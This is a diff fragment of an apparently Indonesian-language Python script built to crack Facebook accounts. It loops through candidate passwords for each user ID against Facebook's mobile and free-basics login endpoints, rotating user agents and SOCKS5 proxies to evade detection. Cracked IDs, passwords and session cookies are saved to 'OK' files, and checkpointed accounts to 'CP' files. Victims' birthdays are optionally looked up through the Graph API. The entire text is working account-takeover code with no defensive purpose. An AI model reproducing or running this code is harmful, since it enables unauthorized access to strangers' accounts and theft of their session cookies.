+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						nama_ = x["name"]
+						#id_ = x["id"]
+						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
+						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					cp+=1
+				else:continue
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						coki=po.cookies.get_dict()
+						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						print("\r %s*--> %s "%(H,kuki))
+						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+						ok+=1
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+				else:continue
+				break
+					
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			turu(31)
+	loop+=1
+	
+def freev2(uiz,pwr):
+	global ok,cp,loop
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
+	ua = random.choice(ua_crack)
+	ses = requests.Session()
+	sys.stdout.write("\r \t\t%s• cracked %s/%s %sok:%s %scp:%s "%(P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	for pw in pwr:
+		pw = pw.lower()
+		try:
+			proxff= open('proxy_mat.txt','r').read().splitlines()
+			cuukk=random.choice(proxff)
+			proxs= {'http': 'socks5://'+cuukk}
+			#proxs2= {'http': 'socks4://'+nip}
+			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://free.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						nama_ = x["name"]
+						#id_ = x["id"]
+						print("\r %s*--> %s|%s|%s "%(K,uiz,pw,ttl))
+						open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(K,uiz,pw))
+					open('CP'+cpz,'a').write(uiz+'|'+pw+'\n')
+					cp+=1
+				else:continue
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				if "no" in tampilkan_ttl:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+					break
+				elif "ya" in tampilkan_ttl:
+					try:
+						coki=po.cookies.get_dict()
+						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+						token = open('token.txt','r').read()
+						cookie = open('cookie.txt','r').read()
+						coki = {"cookie":cookie}
+						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
+						x = json.loads(xn.text)
+						ttl = x['birthday']
+						print("\r %s*--> %s|%s|%s "%(H,uiz,pw,ttl))
+						print("\r %s*--> %s "%(H,kuki))
+						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+						ok+=1
+						break
+					except(KeyError, IOError):
+						ttl = " "
+					except:pass
+					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+				else:continue
+				break
+					
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			turu(31)
+	loop+=1
+
+cek_cookie()
